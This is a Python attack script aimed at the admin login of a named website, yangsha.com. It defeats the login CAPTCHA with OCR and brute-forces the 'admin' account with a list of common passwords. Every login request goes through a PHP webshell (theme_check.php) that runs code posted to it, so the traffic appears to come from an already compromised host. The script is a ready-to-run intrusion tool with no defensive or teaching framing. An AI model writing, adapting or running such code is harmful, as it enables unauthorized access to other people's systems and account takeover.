#!/usr/bin/env python3
"""yangsha_bf2.py - yangsha.com 完整爆破(81.70下载BMP验证码+165 OCR+81.70提交)
"""
import urllib.request, urllib.parse, ssl, re, sys, time, io, base64
import ddddocr
from PIL import Image

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
SHELL = 'http://127.0.0.1:13080/theme_check.php'
BASE = 'http://www.yangsha.com'

PASSWORDS = ["admin", "admin123", "123456", "admin888", "12345678", "password",
             "admin@123", "admin1234", "123456a", "a123456", "666666", "888888",
             "000000", "qwer1234", "abc123", "admin666", "123123", "111111",
             "654321", "admin2023", "admin2024", "Admin123", "123qwe", "zxcvbnm",
             "admin12345", "yangsha", "yangsha123", "yzdf", "123456789"]

def php_exec(code):
    try:
        req = urllib.request.Request(SHELL, data=urllib.parse.urlencode({'x': code}).encode(),
                                     headers={**UA, 'Content-Type': 'application/x-www-form-urlencoded'})
        r = urllib.request.urlopen(req, timeout=25, context=ctx)
        return r.read(50000).decode('utf-8', 'ignore')
    except Exception as e:
        return 'ERR:' + repr(e)[:80]

def get_cap_b64():
    """通过getcap.php下载验证码, 返回base64"""
    try:
        # 先触发下载(带新cookie)
        php = ('$ch=curl_init("http://127.0.0.1:13080/getcap.php");curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);'
               'curl_setopt($ch,CURLOPT_TIMEOUT,15);echo curl_exec($ch);')
        # 直接用165请求getcap.php
        r = urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:13080/getcap.php',
                                    headers={'User-Agent': 'Mozilla/5.0'}), timeout=20, context=ctx)
        out = r.read(5000).decode('utf-8', 'ignore')
        m = re.search(r'SAVED:(\d+)', out)
        if not m:
            return None
        # 下载图片
        r2 = urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:13080/ys_cap.jpg',
                                     headers={'User-Agent': 'Mozilla/5.0'}), timeout=15, context=ctx)
        img = r2.read()
        return base64.b64encode(img).decode()
    except Exception as e:
        return None

def do_login(pw, code, jar):
    data = 'username=admin&password=%s&Code=%s' % (pw, code)
    php = ('$ch=curl_init("%s/admin/login.asp?action=check");curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);'
           'curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch,CURLOPT_POSTFIELDS,"%s");'
           'curl_setopt($ch,CURLOPT_COOKIEJAR,"%s");curl_setopt($ch,CURLOPT_COOKIEFILE,"%s");'
           'curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);curl_setopt($ch,CURLOPT_TIMEOUT,12);'
           '$r=curl_exec($ch);echo $r;' % (BASE, data, jar, jar))
    return php_exec(php)

def main():
    ocr = ddddocr.DdddOcr(show_ad=False)
    ocrb = ddddocr.DdddOcr(show_ad=False, beta=True)
    for pw in PASSWORDS:
        for attempt in range(8):
            b64 = get_cap_b64()
            if not b64:
                print('cap dl fail %s' % pw, flush=True)
                time.sleep(3)
                continue
            img = base64.b64decode(b64)
            c1 = ocr.classification(img)
            try:
                im = Image.open(io.BytesIO(img)).convert('L')
                im = im.resize((im.width * 4, im.height * 4), Image.LANCZOS)
                im = im.point(lambda p: 255 if p > 120 else 0)
                buf = io.BytesIO(); im.save(buf, 'PNG')
                c2 = ocrb.classification(buf.getvalue())
            except Exception:
                c2 = c1
            code = c1 if c1 == c2 else (c2 if len(c2) == 4 else c1)
            resp = do_login(pw, code, 'ysb_%d.txt' % attempt)
            if '验证码' in resp:
                continue
            if '错误' in resp or '失败' in resp or '密码' in resp:
                print('pw-wrong %s' % pw, flush=True)
                time.sleep(2)
                break
            if '管理' in resp or '欢迎' in resp or 'logout' in resp.lower():
                print('!!! HIT: admin/%s' % pw, flush=True)
                sys.exit(0)
            print('CHECK %s: %s' % (pw, resp[:80].replace(chr(10), ' ')), flush=True)
            time.sleep(2)
            break
    print('=== NO HIT ===')

if __name__ == '__main__':
    main()
